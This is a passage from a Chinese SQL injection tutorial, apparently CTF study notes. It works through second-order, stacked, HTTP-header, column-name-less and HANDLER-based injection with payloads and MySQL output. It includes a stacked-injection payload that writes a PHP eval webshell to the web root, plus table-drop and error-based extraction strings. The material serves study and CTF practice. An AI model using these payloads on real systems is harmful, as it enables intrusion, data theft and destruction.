class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">654321</span></span><br><span class="line"><span class="string">654321</span></span><br></pre></td></tr></table></figure><p>代入 sql 语句中得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;654321&#x27;</span> <span class="built_in">where</span> username=<span class="string">&#x27;Dumb&#x27;</span><span class="comment">#&#x27; and password=&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure><p>这样看来，我们实际上修改的是 用户名为 <code>Dumb</code> 的密码</p></li><li><p>这样我们就在只以知某一用户名，不知其密码的情况下，通过 <strong>二次注入</strong> ，成功的可以登录其它用户的账号了</p></li></ol><h2 id="十三、堆叠注入"><a href="#十三、堆叠注入" class="headerlink" title="十三、堆叠注入"></a>十三、堆叠注入</h2><p>SQL语句书写时，以 分号 <code>;</code> 表示一条SQL语句结束，通过使用分号同时执行多条 SQL语句 即为 <code>堆叠注入</code> 。该注入可修改数据库的任意结构和数据。</p><p>测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users <span class="built_in">where</span> id= 1;create table  qwe like users;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| qwe                |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> id= 1;drop table  qwe;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>堆叠注入写一句话木马文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&#x27;;select &#x27;</span>&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[111]); ?&gt;<span class="string">&#x27; into outfile &#x27;</span>/var/www/html/hacker.php<span class="string">&#x27;;--+</span></span><br></pre></td></tr></table></figure><p><strong>题例：[GYCTF2020]Blacklist1</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 2#</span></span><br><span class="line"><span class="string">1&#x27;</span>;show databases;<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;;select database();#</span></span><br><span class="line"><span class="string">1&#x27;</span>;show tables;</span><br><span class="line">1<span class="string">&#x27;;show columns from 表名;#</span></span><br><span class="line"><span class="string">1&#x27;</span>create table 新表名 like 已知表名;<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;;drop table 新表名;#</span></span><br><span class="line"><span class="string">1&#x27;</span>;handler 表名 open;handler 表名 <span class="built_in">read</span> first;<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="十四、HTTP-头部注入"><a href="#十四、HTTP-头部注入" class="headerlink" title="十四、HTTP 头部注入"></a>十四、HTTP 头部注入</h2><h3 id="14-1-User-Agent-注入"><a href="#14-1-User-Agent-注入" class="headerlink" title="14.1 User-Agent 注入"></a>14.1 User-Agent 注入</h3><p>源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="variable">$uagent</span>&#x27;, &#x27;<span class="variable">$IP</span>&#x27;, <span class="variable">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>当将 客户端可控的 <code>$uagent</code> 带入代入 <code>$insert</code> sql 语句时，必须将紧随其后的 单引号先闭合</p><p>抓包，修改 User-Agent 值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:a<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样代进去即为</span></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;<span class="variable">$IP</span>&#x27;, <span class="variable">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="14-2-Referer-注入"><a href="#14-2-Referer-注入" class="headerlink" title="14.2 Referer 注入"></a>14.2 Referer 注入</h3><p>源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="variable">$uagent</span>&#x27;, &#x27;<span class="variable">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>同样的道理：当将 客户端可控的 <code>$uagent</code> 带入代入 <code>$insert</code> sql 语句时，必须将紧随其后的 单引号先闭合</p><p>抓包，修改 Referer 值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Referer:a<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样代进去即为</span></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;<span class="variable">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="14-3-Cookie-注入"><a href="#14-3-Cookie-注入" class="headerlink" title="14.3 Cookie 注入"></a>14.3 Cookie 注入</h3><p>如今绝大部门开发人员在开发过程中会对用户传入的参数进行适当的过滤，但是很多时候，由于个人对安全技术了解的不同，有些开发人员只会对get，post这种方式提交的数据进行参数过滤。</p><p>但我们知道，很多时候，提交数据并非仅仅只有get / post这两种方式，还有一种经常被用到的方式：request(“xxx”),即request方法。通过这种方法一样可以从用户提交的参数中获取参数值。</p><p><strong>这就造成了cookie注入的最基本条件：使用了request方法，但是只对用户get / post提交的数据进行过滤。</strong></p><p>例如：<code>www.xx.com/search.asp?id=1</code></p><p>访问：<code>www.xx.com/srarch.asp</code>　发现不能访问，说缺少id参数。</p><p>我们试着将id=1放在cookie中再次访问，查看能否访问，如果能访问，则说明id参数可以通过cookie提交。</p><p>那么，如果后端没有对cookie中传入的数据进行过滤，那么，这个网站就有可能存在cookie注入了！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="variable">$username</span>;</span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="variable">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="十五、无列名注入"><a href="#十五、无列名注入" class="headerlink" title="十五、无列名注入"></a>十五、无列名注入</h2><p> Mysql 版本 &gt; 5 时，都会存在一个元数据库 <code>information_schema</code> ，其中记录着 mysql 所有库、以及表的结构，我们通常的 sql 注入手段即是通过该元数据库来获取到其它库以及表的信息。那如果这个 <code>information_schema</code> 被过滤掉了该怎么办？</p><h3 id="15-1-使用别的具有类似功能的库"><a href="#15-1-使用别的具有类似功能的库" class="headerlink" title="15.1 使用别的具有类似功能的库"></a>15.1 使用别的具有类似功能的库</h3><p>除了 <code>information_schema</code> 中存在 <code>tables  schemata  columns  </code> 等表的信息外，在高版本当中还存在 <code>INNODB_TABLES</code>  <code>INNODS_COLUMNS</code> 中也记录着表的结构。</p><h4 id="15-1-1-sys-数据库"><a href="#15-1-1-sys-数据库" class="headerlink" title="15.1.1 sys 数据库"></a>15.1.1 sys 数据库</h4><ul><li><p><strong>利用mysql5.7新增的 sys.schema_auto_increment_columns</strong></p><p>基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名</p><p>关于该表的视图    <a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-auto-increment-columns.html">https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-auto-increment-columns.html</a></p><p><img src="https://i.loli.net/2021/07/26/WcsAFo4brvGk1HQ.png" alt="image-20210726115705011"></p></li><li><p><strong>sys.schema_table_statistics_with_buffer</strong></p><p><img src="https://i.loli.net/2021/07/26/lIYZEAwComGO9an.png" alt="image-20210726115902236"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 利用语句</span><br><span class="line"></span><br><span class="line">#查数据库</span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_auto_increment_columns;　　</span><br><span class="line">#查表</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database();　　</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><p>类似的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">与它表结构相似的视图还有</span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$schema_table_statistics_with_buffer</span></span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$schema_table_statistics</span></span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$ps_schema_table_statistics_io</span></span><br><span class="line">    </span><br><span class="line">参考：https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-redundant-indexes.html</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/26/waSdL9Z8jpWcKbQ.png" alt="image-20210726120047304"></p></li></ul><h4 id="15-1-2-mysql-默认存储引擎-INNODB-所携带的表"><a href="#15-1-2-mysql-默认存储引擎-INNODB-所携带的表" class="headerlink" title="15.1.2 mysql 默认存储引擎 INNODB 所携带的表"></a>15.1.2 mysql 默认存储引擎 INNODB 所携带的表</h4><ul><li><strong>mysql.innodb_table_stats</strong></li><li><strong>mysql.innodb_index_stats</strong></li></ul><p><img src="https://i.loli.net/2021/07/26/y9D2XuApPm5wYGW.png" alt="image-20210726120244786"></p><p><img src="https://i.loli.net/2021/07/26/YR5okn6FbNxaZBQ.png" alt="image-20210726120309138"></p><h3 id="15-2-union-select-构造虚表"><a href="#15-2-union-select-构造虚表" class="headerlink" title="15.2 union select 构造虚表"></a>15.2 union select 构造虚表</h3><p>实验：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from `users`;</span><br><span class="line">select 1,2,3 union select * from users;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | 321        |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 15 | Dummy<span class="string">&#x27;#  | 123        |</span></span><br><span class="line"><span class="string">+----+----------+------------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 我们将列名替换成为了 数字 1,2,3</span></span><br><span class="line"><span class="string"># 那么我们就可以使用数字来对应其中的列名</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select `2` from (select 1,2,3 union select * from users)a;</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">| Dumb     |</span><br><span class="line">| Angelina |</span><br><span class="line">| Dummy    |</span><br><span class="line">| secure   |</span><br><span class="line">| stupid   |</span><br><span class="line">| superman |</span><br><span class="line">| batman   |</span><br><span class="line">| admin    |</span><br><span class="line">| admin1   |</span><br><span class="line">| admin2   |</span><br><span class="line">| admin3   |</span><br><span class="line">| dhakkan  |</span><br><span class="line">| admin4   |</span><br><span class="line">| Dummy<span class="string">&#x27;#  |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 这时我们已经取到了第二列的内容</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当 `` 被过滤时，使用别名代替</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select b from (select 1,2 as b,3 union select * from users)a;</span><br><span class="line">+----------+</span><br><span class="line">| b        |</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">| Dumb     |</span><br><span class="line">| Angelina |</span><br><span class="line">| Dummy    |</span><br><span class="line">| secure   |</span><br><span class="line">| stupid   |</span><br><span class="line">| superman |</span><br><span class="line">| batman   |</span><br><span class="line">| admin    |</span><br><span class="line">| admin1   |</span><br><span class="line">| admin2   |</span><br><span class="line">| admin3   |</span><br><span class="line">| dhakkan  |</span><br><span class="line">| admin4   |</span><br><span class="line">| Dummy<span class="string">&#x27;#  |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同时查询多列</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a;</span><br><span class="line">+----------------------+</span><br><span class="line">| concat(`2`,0x5e,`3`) |</span><br><span class="line">+----------------------+</span><br><span class="line">| 2^3                  |</span><br><span class="line">| Dumb^Dumb            |</span><br><span class="line">| Angelina^I-kill-you  |</span><br><span class="line">| Dummy^321            |</span><br><span class="line">| secure^crappy        |</span><br><span class="line">| stupid^stupidity     |</span><br><span class="line">| superman^genious     |</span><br><span class="line">| batman^mob!le        |</span><br><span class="line">| admin^admin          |</span><br><span class="line">| admin1^admin1        |</span><br><span class="line">| admin2^admin2        |</span><br><span class="line">| admin3^admin3        |</span><br><span class="line">| dhakkan^dumbo        |</span><br><span class="line">| admin4^admin4        |</span><br><span class="line">| Dummy<span class="string">&#x27;#^123          |</span></span><br><span class="line"><span class="string">+----------------------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a limit 0,1;</span></span><br></pre></td></tr></table></figure><h3 id="15-3-JOIN-爆破"><a href="#15-3-JOIN-爆破" class="headerlink" title="15.3 JOIN 爆破"></a>15.3 JOIN 爆破</h3><p>本质：通过 <strong>报错</strong> 得到列名</p><ul><li>join 连接两张表</li><li>using() 用于两张表之间的 join 连接查询，并且 using()中的列在两张表中都存在，作为 join 的条件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常用语句 select * from (select * from 表名 as a join 表名 as b)as c;</span></span><br><span class="line"><span class="comment"># 一一爆字段</span></span><br><span class="line">select * from (select * from users as a join news as b)as c;</span><br><span class="line"></span><br><span class="line">select * from (select * from users a join users b using(id))c;</span><br><span class="line"></span><br><span class="line">select * from (select * from users a join users b using(id,name))c;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">select * from (select * from users a join users b using(id,name,passwd))c;</span><br></pre></td></tr></table></figure><p>测试 </p><p>创建表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table users(id int,name varchar(20),passwd varchar(32));</span><br><span class="line">insert into users value(1,<span class="string">&#x27;mickey&#x27;</span>,<span class="string">&#x27;827ccb0eea8a706c4c34a16891f84e7b&#x27;</span>);</span><br><span class="line"></span><br><span class="line">create table news(is_admin int(1),id int(2),title varchar(100),date date);</span><br><span class="line">insert into news values(1,1,<span class="string">&#x27;hello,mickey&#x27;</span>,now());</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆列名</span></span><br><span class="line">mysql&gt; select * from (select * from users as a join news as b)as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;name&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id,name))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">mysql&gt; select * from (select * from users a join users b using(id,name,passwd))c;</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">| id   | name   | passwd                           |</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">|    1 | mickey | 827ccb0eea8a706c4c34a16891f84e7b |</span><br><span class="line">+------+--------+----------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆列名</span></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;is_admin&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;title&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin,title))as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name <span class="string">&#x27;date&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆内容</span></span><br><span class="line">mysql&gt; select * from (select * from news a join news b using(id,is_admin,title,date))as c;</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">| is_admin | id   | title        | date       |</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">|        1 |    1 | hello,mickey | 2021-07-26 |</span><br><span class="line">+----------+------+--------------+------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.04 sec)</span><br></pre></td></tr></table></figure><h2 id="十六、Mysql-查询语句-之-Handler"><a href="#十六、Mysql-查询语句-之-Handler" class="headerlink" title="十六、Mysql 查询语句 之 Handler"></a>十六、Mysql 查询语句 之 Handler</h2><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">官方文档</a></p><ul><li>mysql除可使用select查询表中的数据，也可使用handler语句，它每次只能查询1条记录，而 select 可以根据需要返回多条查询结果。因此 handler语 句并不具备 select 语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</li><li>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</li><li>可以降低优化器对于SQL语句的解析与优化开销，从而提升查询性能。</li></ul><p><strong>测试：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database practice;</span><br><span class="line">use practice;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> handler_table(id <span class="type">int</span>,username <span class="type">varchar</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">desc</span> handler_table;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;李华&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;小马&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;张鑫&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">4</span>,<span class="string">&#x27;周明&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> handler_table <span class="keyword">values</span>(<span class="number">5</span>,<span class="string">&#x27;蔡紫&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> handler_tables;</span><br></pre></td></tr></table></figure><p><strong>不通过索引查表：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#打开句柄</span><br><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line">#查询数据</span><br><span class="line">handler handler_table read <span class="keyword">first</span>;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read 